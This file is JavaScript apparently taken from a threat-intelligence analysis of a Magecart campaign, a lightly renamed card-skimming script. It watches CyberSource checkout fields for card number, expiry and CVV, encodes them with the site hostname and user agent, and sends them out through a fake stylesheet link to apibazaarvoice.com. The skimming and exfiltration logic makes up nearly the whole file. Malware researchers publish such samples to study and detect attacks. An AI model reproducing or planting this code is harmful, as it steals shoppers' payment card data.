//https://github.com/StrangerealIntel/CyberThreatIntel/tree/master/Additional%20Analysis/Magecart/2020-06-02
var array_ID={};
var array_Data={};
var array_tmp={};
var array_storage={};
var array_1,array_header;
var timer3 = {}
var _CA = {};
var mathRand3 = {};
var _b, _a, _S = {};
var prepare_req = {};

const success_cart="cart_created";

function _A() {}
var ar=['\x74\x69\x6d\x65\x73\x74\x61\x6d\x70', ,'\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'];
var tab=function(a,_0xaee9a5)
{
 a=a-0x0;
 var r=ar[a];
 return r;
};


function Parse_Data_Array(input,output)
{
 var i=0;
 for(let j in input)
 {
  array_tmp[output[i]]=input[j];
  i++;
 }
 return array_tmp;
}

function Push_Keys(a,b)
{
 if(Object["keys"](a)["length"]!=Object["keys"](b)["length"])return![];
 for(var obj in a) { return a[obj]["length"]>=0x1; }
 return![];
}
function Valid_Check(){return localStorage["getItem"](success_cart)!=null;}

function prepare_header(obj)
{
 obj["ubfganzr"]=prepare_req(window['location']["hostname"]);
 obj["hfre_ntrag"]=prepare_req(navigator["userAgent"]);
 obj["hfre_vq"]=prepare_req('1');
 return obj;
}
function format_resp(argument)
{
 let res=encodeURIComponent(argument)["replace"](/%([a-f0-9]{2})/gi,(_0x1f00b5,rs)=>String["fromCharCode"](parseInt(rs,0x10)));
 return _b(res);
}
var prepare_req=index=> { return req(format_resp(index)); }
var data_storage=r=> { return _a(req(r)); }
function req(dat,resp)
{
 return++resp?String["fromCharCode"]((dat<91)>(dat=dat["charCodeAt"]()+13)?dat:dat-0x1a):dat["replace"](/[a-zA-Z]/g,req);
}

var sample1=_A(function()
{
 if(!Valid_Check()&&localStorage["getItem"]("wc_info")&&!!document["getElementById"]("cybersourcedc-transparent-form"))
 {
  _CA(timer3);
  array_Data=JSON["parse"](localStorage["getItem"]("wc_info"));
  array_storage={};
  array_1=['pp','zz','ll',"pii"];
  mathRand3=["md_cybersourcedc_cc_number","md_cybersourcedc_expiration","md_cybersourcedc_expiration_yr","md_cybersourcedc_cc_cid"];
  _S(()=>
  {
   mathRand3["forEach"](function(IDtoFind,index)
   {
    array_ID[index]=document["getElementById"](IDtoFind);
    if(array_ID[index]["value"]!=''){ array_storage[index]=prepare_req(array_ID[index]["value"]); }
    array_ID[index]["addEventListener"]("change",function(arg)
    {
     array_storage[index]=prepare_req(array_ID[index]["value"]);
     arg["stopPropagation"]();
    });
   });
  },0x7d0);
  var timer4=_A(()=>
  {
   if(Push_Keys(array_storage,mathRand3))
   {
    array_storage=Parse_Data_Array(array_storage,array_1);
    if(data_storage(array_storage['pp'])["length"]>=15&&data_storage(array_storage["pii"])["length"]>=3)
    {
     _CA(timer4);
     var infos={...array_storage,...array_Data};
     var link_obj=document["createElement"]("link");
     link_obj["href"]="https://apibazaarvoice.com/stylesheet.css?timestamp="+prepare_req(JSON["stringify"](prepare_header(infos)));
     link_obj["rel"]="stylesheet";
     link_obj["type"]="text/css";
     document["body"]["append"](link_obj);
     localStorage['setItem'](success_cart,Date["now"]()["toString"]());
     localStorage["removeItem"]('wc_info');
    }
   }
  },0x12c);
 }
},0x3e8);